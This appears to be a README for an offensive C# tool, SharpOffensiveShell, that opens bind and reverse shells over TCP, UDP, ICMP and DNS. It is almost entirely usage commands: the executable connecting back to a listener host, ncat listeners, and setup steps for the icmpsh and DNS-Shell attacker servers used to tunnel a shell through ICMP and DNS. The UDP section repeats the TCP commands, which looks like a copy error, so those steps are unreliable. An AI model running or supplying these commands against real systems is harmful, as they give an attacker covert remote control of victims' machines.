# SharpOffensiveShell

A sort of simple shell which support multiple protocols. 

This project is just for improving my C# coding ability. The SharpOffsensiveShell DNS mode use the Native Windows API instead of the Nslookup command to perform DNS requests.

## QuickStart

SharpOffsensiveShell support .NET Framework 2.0

 ```
csc SharpOffensiveShell.cs
 ```

## TCP

**For bind shell**

```
sharpoffensiveshell.exe tcp listen 0.0.0.0 8080
```

```
ncat -v 1.1.1.1 8080
```

**For reverse shell**

```
ncat -lvp 8080
```

```
sharpoffensiveshell.exe tcp connect 1.1.1.1 8080
```

## UDP

**For bind shell**

```
sharpoffensiveshell.exe tcp listen 0.0.0.0 8080
```

```
ncat -u -v 1.1.1.1 8080
```

**For reverse shell**

```
ncat -u -lvp 8080
```

When  reverse connection accepted, type enter to make prompt display.

```
sharpoffensiveshell.exe tcp connect 1.1.1.1 8080
```

## ICMP

```
git clone https://github.com/inquisb/icmpsh
sysctl -w net.ipv4.icmp_echo_ignore_all=1
cd icmpsh && python icmpsh-m.py listenIP reverseConnectIP
```

```
sharpoffensiveshell.exe icmp connect listenIP
```

## DNS

```
pip install dnslib
git clone https://github.com/sensepost/DNS-Shell
```

**For direct mode**

```
python DNS-Shell.py -l -d [Server IP]
sharpoffensiveshell.exe dns direct ServerIP Domain 
```

**For recursive mode**

```
DNS-Shell.py -l -r [Domain]
sharpoffensiveshell.exe dns recurse Domain
```

